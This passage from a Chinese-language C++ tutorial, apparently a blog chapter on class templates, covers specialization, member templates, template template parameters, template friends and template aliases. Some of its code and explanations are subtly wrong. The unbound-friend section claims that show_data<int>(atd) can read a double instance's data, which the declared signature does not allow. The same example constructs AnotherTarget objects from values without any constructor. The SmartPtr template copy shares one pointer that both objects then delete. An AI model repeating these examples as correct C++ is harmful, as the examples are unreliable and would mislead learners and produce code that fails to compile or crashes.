class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // for strcpy, strlen</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 显式具体化 Stack&lt;const char*&gt;</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span>&lt;</span><span class="keyword">const</span> <span class="keyword">char</span> *&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MAX = <span class="number">5</span> &#125;; <span class="comment">// 假设容量不同</span></span><br><span class="line">    <span class="keyword">char</span> * items[MAX]; <span class="comment">// 存储指向动态分配字符串的指针</span></span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Stack();</span><br><span class="line">    ~Stack(); <span class="comment">// 需要析构函数释放内存</span></span><br><span class="line">    <span class="comment">// ... isempty, isfull ...</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">push</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> &amp; item)</span></span>; <span class="comment">// 注意参数类型</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">pop</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * &amp; item)</span></span>; <span class="comment">// 注意参数类型</span></span><br><span class="line">    <span class="comment">// 需要禁用或实现复制构造和赋值</span></span><br><span class="line">    Stack(<span class="keyword">const</span> Stack &amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    Stack &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Stack &amp;) = <span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 (部分)</span></span><br><span class="line">Stack&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;::Stack() : top(<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;MAX; ++i) items[i] = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line">Stack&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;::~Stack() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; top; ++i) &#123;</span><br><span class="line">        <span class="keyword">delete</span> [] items[i]; <span class="comment">// 释放 push 时分配的内存</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;::push(<span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> &amp; item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (top &lt; MAX) &#123;</span><br><span class="line">        items[top] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(item) + <span class="number">1</span>]; <span class="comment">// 分配新内存</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(items[top], item); <span class="comment">// 复制字符串内容</span></span><br><span class="line">        top++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;::pop(<span class="keyword">const</span> <span class="keyword">char</span> * &amp; item) &#123;</span><br><span class="line">     <span class="keyword">if</span> (top &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        top--;</span><br><span class="line">        item = items[top]; <span class="comment">// 返回指针 (注意：调用者不应 delete 这个指针)</span></span><br><span class="line">                           <span class="comment">// 或者更好的做法是复制一份返回</span></span><br><span class="line">        <span class="comment">// delete [] items[top]; // 如果 pop 后不再需要，则删除</span></span><br><span class="line">        <span class="comment">// items[top] = nullptr;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... 其他实现 ...</span></span><br></pre></td></tr></table></figure><p> 当编译器遇到 <code>Stack&lt;const char *&gt;</code> 时，它会使用这个显式具体化版本，而不是通用的 <code>Stack&lt;T&gt;</code> 模板。</p></li><li><p><strong>部分具体化 (Partial Specialization):</strong> 只限制模板参数的一部分，而不是全部。例如，为所有指针类型提供一个特殊版本，或者为一个有两个类型参数的模板固定其中一个参数。</p><p> <strong>语法 (示例):</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原始模板</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt; <span class="class"><span class="keyword">class</span> <span class="title">Pair</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 部分具体化：T2 固定为 int</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1&gt; <span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;</span>T1, <span class="keyword">int</span>&gt; &#123; <span class="comment">/* ... 特殊实现 ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 部分具体化：T1 和 T2 都是指针类型</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt; <span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;</span>T1*, T2*&gt; &#123; <span class="comment">/* ... 特殊实现 ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 部分具体化：T1 和 T2 是相同类型</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;</span>T, T&gt; &#123; <span class="comment">/* ... 特殊实现 ... */</span> &#125;;</span><br></pre></td></tr></table></figure><p> 编译器会选择最匹配的具体化版本。如果多个部分具体化都能匹配，或者一个部分具体化和一个显式具体化都能匹配，编译器会选择“更具体”的那个。</p></li></ol><h3 id="14-4-7-成员模板"><a href="#14-4-7-成员模板" class="headerlink" title="14.4.7 成员模板"></a>14.4.7 成员模板</h3><p>类（无论是普通类还是模板类）可以包含本身是模板的成员函数或成员类。这称为**成员模板 (Member Templates)**。</p><p><strong>示例：模板构造函数和模板赋值运算符</strong></p><p>智能指针类（如 <code>unique_ptr</code>, <code>shared_ptr</code>）经常使用模板构造函数和模板赋值运算符，以允许从指向派生类的智能指针构造或赋值给指向基类的智能指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmartPtr</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T* ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">SmartPtr</span><span class="params">(T* p = <span class="literal">nullptr</span>)</span> : <span class="title">ptr</span><span class="params">(p)</span> </span>&#123;&#125;</span><br><span class="line">    ~SmartPtr() &#123; <span class="keyword">delete</span> ptr; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模板成员：模板复制构造函数</span></span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> U&gt;</span><br><span class="line">    SmartPtr(<span class="keyword">const</span> SmartPtr&lt;U&gt;&amp; other) &#123;</span><br><span class="line">        <span class="comment">// 允许从 SmartPtr&lt;U&gt; 构造 SmartPtr&lt;T&gt;</span></span><br><span class="line">        <span class="comment">// 通常需要 U* 能够隐式转换为 T* (例如 U 是 T 的派生类)</span></span><br><span class="line">        ptr = other.get(); <span class="comment">// 简化示例，实际智能指针复制更复杂</span></span><br><span class="line">        <span class="comment">// ... 可能需要增加引用计数等 ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模板成员：模板赋值运算符</span></span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> U&gt;</span><br><span class="line">    SmartPtr&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> SmartPtr&lt;U&gt;&amp; other) &#123;</span><br><span class="line">        <span class="comment">// ... 类似逻辑 ...</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">T* <span class="title">get</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> ptr; &#125;</span><br><span class="line">    <span class="comment">// ... 其他成员 ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">SmartPtr&lt;Derived&gt; <span class="title">pDerived</span><span class="params">(<span class="keyword">new</span> Derived)</span></span>;</span><br><span class="line">SmartPtr&lt;Base&gt; pBase = pDerived; <span class="comment">// OK: 调用模板复制构造函数 SmartPtr&lt;Base&gt;(const SmartPtr&lt;Derived&gt;&amp;)</span></span><br></pre></td></tr></table></figure><p>成员模板增加了类的灵活性，允许成员函数或嵌套类处理更广泛的类型。</p><h3 id="14-4-8-将模板用作参数"><a href="#14-4-8-将模板用作参数" class="headerlink" title="14.4.8 将模板用作参数"></a>14.4.8 将模板用作参数</h3><p>模板本身也可以作为模板的参数，这称为**模板模板参数 (Template Template Parameters)**。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">template</span> &lt;<span class="keyword">typename</span> U&gt; <span class="class"><span class="keyword">class</span> <span class="title">Container</span>&gt;</span> <span class="comment">// Container 是一个模板模板参数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Container&lt;T&gt; items; <span class="comment">// 使用模板参数 Container 来实例化</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;typename U&gt; class Container</code>: 声明 <code>Container</code> 是一个接受一个类型参数的类模板。</li><li>  在 <code>Manager</code> 内部，可以用具体的类型 <code>T</code> 来实例化 <code>Container</code>，如 <code>Container&lt;T&gt;</code>。</li></ul><p><strong>示例:</strong> 创建一个可以使用不同容器（如 <code>std::vector</code>, <code>std::list</code>, 或我们自己的 <code>Stack</code>）来存储元素的 <code>Manager</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stacktp.h&quot;</span> <span class="comment">// 假设 Stack&lt;T&gt; 在这里</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Elem&gt; <span class="class"><span class="keyword">class</span> <span class="title">Container</span>&gt;</span> <span class="comment">// Container 接受一个类型参数 Elem</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Container&lt;T&gt; items; <span class="comment">// 使用 Container&lt;T&gt; 来存储 T 类型的元素</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">const</span> T&amp; item)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 假设 Container 有 push_back 或 push 方法</span></span><br><span class="line">        <span class="comment">// items.push_back(item); // 如果是 vector/list</span></span><br><span class="line">        <span class="comment">// items.push(item); // 如果是 Stack</span></span><br><span class="line">        <span class="comment">// 需要更通用的方式或对 Container 有要求</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 std::vector 作为容器</span></span><br><span class="line">    Manager&lt;<span class="keyword">int</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&gt; vectorManager;</span><br><span class="line">    <span class="comment">// vectorManager.add(10);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 std::list 作为容器</span></span><br><span class="line">    Manager&lt;<span class="keyword">double</span>, <span class="built_in">std</span>::<span class="built_in">list</span>&gt; listManager;</span><br><span class="line">    <span class="comment">// listManager.add(3.14);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用我们自己的 Stack 作为容器</span></span><br><span class="line">    Manager&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, Stack&gt; stackManager;</span><br><span class="line">    <span class="comment">// stackManager.add(&quot;hello&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板模板参数使得代码更加通用，可以适配不同的模板结构。</p><h3 id="14-4-9-模板类和友元"><a href="#14-4-9-模板类和友元" class="headerlink" title="14.4.9 模板类和友元"></a>14.4.9 模板类和友元</h3><p>友元关系可以与类模板结合，有几种不同的形式：</p><ol><li><p><strong>非模板友元函数/类:</strong> 一个普通的（非模板）函数或类可以是模板类的友元。这意味着这个函数/类可以访问<strong>所有</strong>该模板类实例化的私有成员。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasFriend</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">(<span class="keyword">const</span> HasFriend&lt;T&gt; &amp;)</span></span>; <span class="comment">// 非模板函数 report 是所有实例的友元</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T item;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    HasFriend(<span class="keyword">const</span> T &amp; i) : item(i) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// report 函数需要为每个实例单独定义或使用模板</span></span><br><span class="line"><span class="comment">// void report(const HasFriend&lt;int&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // 针对 int 实例</span></span><br><span class="line"><span class="comment">// void report(const HasFriend&lt;double&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // 针对 double 实例</span></span><br><span class="line"><span class="comment">// 或者将 report 也定义为模板函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report</span><span class="params">(<span class="keyword">const</span> HasFriend&lt;T&gt; &amp; hf)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; hf.item; &#125; <span class="comment">// 模板友元函数</span></span><br></pre></td></tr></table></figure></li><li><p><strong>约束模板友元函数/类 (Bound Template Friend):</strong> 模板函数/类的特定实例化是模板类的特定实例化的友元。即 <code>Friend&lt;T&gt;</code> 是 <code>Target&lt;T&gt;</code> 的友元。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前向声明</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="class"><span class="keyword">class</span> <span class="title">Target</span>;</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">void</span> <span class="title">friend_func</span><span class="params">(<span class="keyword">const</span> Target&lt;T&gt; &amp;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Target</span> &#123;</span></span><br><span class="line">    <span class="comment">// friend_func&lt;T&gt; 是 Target&lt;T&gt; 的友元</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">void</span> friend_func&lt;T&gt;(<span class="keyword">const</span> Target&lt;T&gt; &amp;);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">friend_func</span><span class="params">(<span class="keyword">const</span> Target&lt;T&gt; &amp; t)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; t.data; <span class="comment">// 可以访问 Target&lt;T&gt; 的私有成员</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里，<code>friend_func&lt;int&gt;</code> 是 <code>Target&lt;int&gt;</code> 的友元，<code>friend_func&lt;double&gt;</code> 是 <code>Target&lt;double&gt;</code> 的友元，但 <code>friend_func&lt;int&gt;</code> 不是 <code>Target&lt;double&gt;</code> 的友元。</p></li><li><p><strong>非约束模板友元函数/类 (Unbound Template Friend):</strong> 模板函数/类的<strong>所有</strong>实例化都是模板类的<strong>所有</strong>实例化的友元。即任何 <code>Friend&lt;U&gt;</code> 都是任何 <code>Target&lt;T&gt;</code> 的友元。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnotherTarget</span> &#123;</span></span><br><span class="line">    <span class="comment">// 声明模板函数 show_data 为友元</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> U&gt; <span class="comment">// 模板参数 U 可以与 T 不同</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">show_data</span><span class="params">(<span class="keyword">const</span> AnotherTarget&lt;U&gt; &amp;)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> U&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_data</span><span class="params">(<span class="keyword">const</span> AnotherTarget&lt;U&gt; &amp; at)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; at.data; <span class="comment">// 可以访问任何 AnotherTarget&lt;U&gt; 实例的私有成员</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="function">AnotherTarget&lt;<span class="keyword">int</span>&gt; <span class="title">ati</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function">AnotherTarget&lt;<span class="keyword">double</span>&gt; <span class="title">atd</span><span class="params">(<span class="number">3.14</span>)</span></span>;</span><br><span class="line"><span class="comment">// show_data&lt;int&gt;(ati); // OK</span></span><br><span class="line"><span class="comment">// show_data&lt;double&gt;(atd); // OK</span></span><br><span class="line"><span class="comment">// show_data&lt;int&gt;(atd); // 也能访问 atd.data，因为 show_data&lt;int&gt; 是所有 AnotherTarget 的友元</span></span><br></pre></td></tr></table></figure><p> 非约束友元提供了最大的访问权限，但也可能破坏封装，需要谨慎使用。</p></li></ol><h3 id="14-4-10-模板别名（C-11）"><a href="#14-4-10-模板别名（C-11）" class="headerlink" title="14.4.10 模板别名（C++11）"></a>14.4.10 模板别名（C++11）</h3><p>C++11 引入了 <code>using</code> 关键字（之前主要用于 <code>using</code> 声明和 <code>using</code> 指令）来创建**模板别名 (Template Aliases)**，使得使用复杂的模板类型更加方便。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为特定实例化创建别名</span></span><br><span class="line"><span class="keyword">using</span> AliasName = ExistingTemplate&lt;ConcreteType&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为模板本身创建别名 (参数化的别名)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> AliasTemplateName = ExistingTemplate&lt;T, SomeFixedType, ...&gt;;</span><br></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为特定实例化创建别名</span></span><br><span class="line"><span class="keyword">using</span> IntVec = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;;</span><br><span class="line"><span class="keyword">using</span> StringArray10 = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="number">10</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为模板创建别名</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> Vec = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;T&gt;; <span class="comment">// Vec&lt;T&gt; 等价于 std::vector&lt;T&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> Array12 = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;T, <span class="number">12</span>&gt;; <span class="comment">// Array12&lt;T&gt; 等价于 std::array&lt;T, 12&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    IntVec numbers; <span class="comment">// numbers 是 std::vector&lt;int&gt;</span></span><br><span class="line">    numbers.push_back(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StringArray10 names; <span class="comment">// names 是 std::array&lt;std::string, 10&gt;</span></span><br><span class="line">    names[<span class="number">0</span>] = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Vec&lt;<span class="keyword">double</span>&gt; doubles; <span class="comment">// doubles 是 std::vector&lt;double&gt;</span></span><br><span class="line">    doubles.push_back(<span class="number">3.14</span>);</span><br><span class="line"></span><br><span class="line">    Array12&lt;<span class="keyword">char</span>&gt; chars; <span class="comment">// chars 是 std::array&lt;char, 12&gt;</span></span><br><span class="line">    chars[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板别名比传统的 <code>typedef</code> 更强大，因为 <code>typedef</code> 不能直接为模板创建别名（只能为完全实例化的类型创建别名）。模板别名提高了代码的可读性和易用性。</p><h2 id="14-5-总结"><a href="#14-5-总结" class="headerlink" title="14.5 总结"></a>14.5 总结</h2><p>本章探讨了 C++ 中除了公有继承之外的其他代码重用技术，包括包含（组合）、私有继承、保护继承、多重继承以及强大的类模板。这些技术提供了不同的方式来建立类之间的关系和创建可重用的通用代码。</p><p>主要内容回顾：</p><ol><li><p><strong>包含/组合 (Composition):</strong></p><ul><li>  通过将一个类的对象作为另一个类的成员来实现，模拟 <strong>“has-a”</strong> 关系。</li><li>  